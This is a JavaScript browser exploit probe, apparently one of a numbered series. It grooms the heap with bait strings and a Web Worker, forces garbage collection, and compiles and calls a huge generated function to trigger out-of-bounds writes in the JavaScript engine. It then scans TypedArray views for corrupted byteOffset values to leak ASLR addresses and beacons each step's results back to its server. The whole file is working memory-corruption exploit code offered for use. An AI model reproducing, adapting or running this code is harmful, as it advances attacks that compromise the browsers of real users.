// p477 — Exact p466c reproduction + worker TypedArray views for byteOffset ASLR leak
//
// p466c PROVEN: 14/14 string corruption, .length=81400
// V476 FAILED: 0/14 — wrong GC pattern (tight loop, no setTimeout, too light)
//
// This probe mirrors p466c EXACTLY for the groom:
//   - 20 bait strings (rope concat + substring + charCodeAt)
//   - Worker creates targets AFTER baits
//   - 30 rounds GC with setTimeout(30ms) — lets GC actually run between rounds
//   - 1000 × 8KB ABs + 500 × 100-arrays per round
//   - Function CALL after compilation (execution-time OOB writes)
//
// ADDITION: Worker creates 700 TypedArray views alongside 14 strings.
// After call, worker scans both .length (string corruption canary) and
// .byteOffset (potential full 8-byte ASLR leak).
//
// Beacon prefix: V477-
(function() {
  var BASE = location.protocol + '//' + location.host;
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V477-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ── WORKER CODE ──
  var workerCode = function() {
    var strings = [];
    var views = [];
    var baseUrl = '';
    var STR_LEN = 100000;

    function beacon(tag, body) {
      try {
        var x = new XMLHttpRequest();
        x.open('POST', baseUrl + '/beacon/V477-W-' + tag, false);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body || '');
      } catch(e) {}
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        // Create string targets (exact p466c pattern)
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) {
            s += 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
          }
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          strings.push(s);
        }

        // Create TypedArray views (48B cells alongside 32B string cells)
        for (var i = 0; i < 700; i++) {
          var ab = new ArrayBuffer(8);
          views.push(new Uint8Array(ab));
        }

        beacon('ALLOC-str' + strings.length + '-view' + views.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'scan') {
        beacon('SCANNING');
        var results = {
          strHits: 0, strLens: [],
          viewByteOffHits: 0, viewByteOffErrors: 0, viewByteOffValues: [],
          viewLenHits: 0, viewLenValues: []
        };

        // Scan string .length
        for (var i = 0; i < strings.length; i++) {
          try {
            var len = strings[i].length;
            if (len !== STR_LEN) {
              results.strHits++;
              if (results.strLens.length < 5) results.strLens.push(i + ':' + len);
            }
          } catch(ex) {
            results.strHits++;
            if (results.strLens.length < 5) results.strLens.push(i + ':ERR');
          }
        }

        // Scan view .byteOffset
        for (var i = 0; i < views.length; i++) {
          try {
            var off = views[i].byteOffset;
            if (off !== 0) {
              results.viewByteOffHits++;
              if (results.viewByteOffValues.length < 10) {
                results.viewByteOffValues.push(i + ':' + off);
              }
            }
          } catch(ex) {
            results.viewByteOffErrors++;
          }
        }

        // Scan view .length
        for (var i = 0; i < views.length; i++) {
          try {
            var vl = views[i].length;
            if (vl !== 8) {
              results.viewLenHits++;
              if (results.viewLenValues.length < 5) results.viewLenValues.push(i + ':' + vl);
            }
          } catch(ex) {}
        }

        self.postMessage({ type: 'results', data: results });
        beacon('SCAN-DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var workerUrl = URL.createObjectURL(workerBlob);
  var worker = new Worker(workerUrl);
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  worker.onmessage = function(e) {
    if (e.data.ready) {
      B('WORKER-READY');
      phaseFreeBaits();
    } else if (e.data.type === 'results') {
      reportResults(e.data.data);
    }
  };

  // ── PHASE 1: BAIT STRINGS (exact p466c pattern) ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  var baits = [];
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) {
      bait += 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    }
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  B('BAITS-' + N_BAIT);

  // ── PHASE 2: WORKER ALLOCATES TARGETS (after baits exist) ──
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 3: FREE BAITS + GC (exact p466c pattern with setTimeout) ──
  function phaseFreeBaits() {
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;
    B('FREED');

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) {
        setTimeout(gcPressureRound, 30);
      } else {
        B('GC-' + gcRound);
        phaseBuild();
      }
    }
    gcPressureRound();
  }

  // ── PHASE 4: COMPILE 38M FUNCTION ──
  function phaseBuild() {
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < rem; r++) remChunk += 'a();';

    var parts = ['window.__p477fn=function(a){'];
    for (var ch = 0; ch < nC; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__p477ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED-' + (window.__p477ok ? 'OK' : 'FAIL'));
      if (!window.__p477fn) { B('NO-FN'); return; }

      // ── PHASE 5: CALL THE FUNCTION (triggers execution OOB writes) ──
      setTimeout(function() {
        B('CALLING');
        try {
          window.__p477fn(function(){});
        } catch(ex) {
          B('CALL-CATCH-' + (ex.message || '').substring(0, 40));
        }
        B('CALL-DONE');

        // ── PHASE 6: Tell worker to scan ──
        setTimeout(function() {
          worker.postMessage({ cmd: 'scan' });
        }, 100);
      }, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function reportResults(r) {
    // String corruption (p466c canary)
    B('STR-HITS', r.strHits + '-of-14');
    if (r.strLens.length > 0) B('STR-LENS', r.strLens.join('|'));

    // View .byteOffset (THE EXPERIMENT)
    B('VIEW-BOFF', 'hits=' + r.viewByteOffHits + ',err=' + r.viewByteOffErrors);
    if (r.viewByteOffValues.length > 0) {
      B('VIEW-BOFF-VALS', r.viewByteOffValues.join('|'));
      var firstVal = r.viewByteOffValues[0].split(':')[1];
      B('THUNK-DEC', firstVal);
    }

    // View .length
    B('VIEW-LEN', 'hits=' + r.viewLenHits);
    if (r.viewLenValues.length > 0) B('VIEW-LEN-VALS', r.viewLenValues.join('|'));

    // Summary
    if (r.viewByteOffHits > 0) {
      B('ASLR-LEAK', 'BYTEOFFSET-' + r.viewByteOffHits + '-hits');
    } else if (r.strHits > 0) {
      B('STR-ONLY', 'str=' + r.strHits + ',views=0');
    } else {
      B('NO-HIT', 'str=0,views=0');
    }
    B('DONE');
  }
})();
